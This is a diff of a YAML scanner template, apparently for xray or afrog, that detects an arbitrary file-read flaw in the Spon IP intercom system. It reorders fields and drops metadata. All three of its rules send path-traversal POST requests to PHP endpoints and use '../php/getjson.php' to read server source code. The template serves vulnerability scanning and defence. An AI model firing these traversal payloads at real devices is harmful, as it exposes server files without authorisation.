@@ -1,38 +1,37 @@
-id: spon-ip-intercom-fileread
-
+expression: r1() || r2() || r3()
+id: spon-ip-intercom-file-read
 info:
-  name: Spon Ip Intercom File Read
   author: york
+  name: Spon Ip Intercom File Read
   severity: high
-  verified: true
-  description: |-
-    fofa: title="Spon IP 智能对讲系统"
-    zoomeye: app="Spon IP 智能对讲系统"
-  reference:
-    - https://www.sponip.com/
-  tags: spon,ip,intercom,fileread
-  created: 2025/10/27
-
 rules:
   r1:
+    expression: response.status == 200 && response.body.bcontains(b"require_once ('conversion.php');")
+      && response.body.bcontains(b"$json_string = file_get_contents($fullpath);")
     request:
-      method: POST
-      path: /php/rj_get_token.php
-      body: |
-        jsondata[url]=../php/getjson.php
-    expression: response.status == 200 && response.body.bcontains(b"require_once ('conversion.php');") && response.body.bcontains(b"$json_string = file_get_contents($fullpath);")
-  r2:
-    request:
-      method: POST
-      path: /php/exportrecord.php?downname=../php/getjson.php
+      body: 'jsondata[url]=../php/getjson.php
+
+        '
       headers:
         Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-    expression: response.status == 200 && response.body.bcontains(b"require_once ('conversion.php');") && response.body.bcontains(b"$json_string = file_get_contents($fullpath);")
-  r3:
+      method: POST
+      path: /php/rj_get_token.php
+  r2:
+    expression: response.status == 200 && response.body.bcontains(b"require_once ('conversion.php');")
+      && response.body.bcontains(b"$json_string = file_get_contents($fullpath);")
     request:
+      headers:
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      method: POST
+      path: /php/exportrecord.php?downname=../php/getjson.php
+  r3:
+    expression: response.status == 200 && response.body.bcontains(b"require_once ('conversion.php');")
+      && response.body.bcontains(b"$json_string = file_get_contents($fullpath);")
+    request:
+      body: 'jsondata[filename]=../php/getjson.php
+
+        '
+      headers:
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
       method: POST
       path: /php/getjson.php
-      body: |
-        jsondata[filename]=../php/getjson.php
-    expression: response.status == 200 && response.body.bcontains(b"require_once ('conversion.php');") && response.body.bcontains(b"$json_string = file_get_contents($fullpath);")
-expression: r1() || r2() || r3()
